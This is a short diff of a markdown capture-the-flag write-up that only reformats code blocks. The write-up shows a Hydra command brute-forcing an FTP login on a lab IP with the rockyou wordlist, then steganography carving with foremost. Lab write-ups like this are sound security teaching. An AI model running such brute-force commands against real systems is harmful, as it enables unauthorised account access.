@@ -57,7 +57,7 @@ Agent R
 ```
 Using Hydra we can attempt a brute force using this username against the FTP port.
 
-```
+```bash
 # hydra -l chris -P ~/rockyou.txt -vV 10.10.86.99 ftp
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -72,7 +72,7 @@ We can then log into the FTP server using the username and password, and we find
 
 Looking at the TXT file we have a hint to some data being hidden in one of the image files, possibly the SSH password for the account 'chris'.
 
-```
+```bash
 $ cat To_agentJ.txt 
 Dear agent J,
 
@@ -84,8 +84,8 @@ Agent C
 
 Sounds like a bit of steganography, possibly even an SSH password hidden in one of the images, so using [foremost](https://en.wikipedia.org/wiki/Foremost_(software)) the following data can be retrieved from cutie.png.
 
-```
- foremost ./cutie.png 
+```bash
+$ foremost ./cutie.png 
 Processing: ./cutie.png
 |foundat=To_agentR.txt
 *|
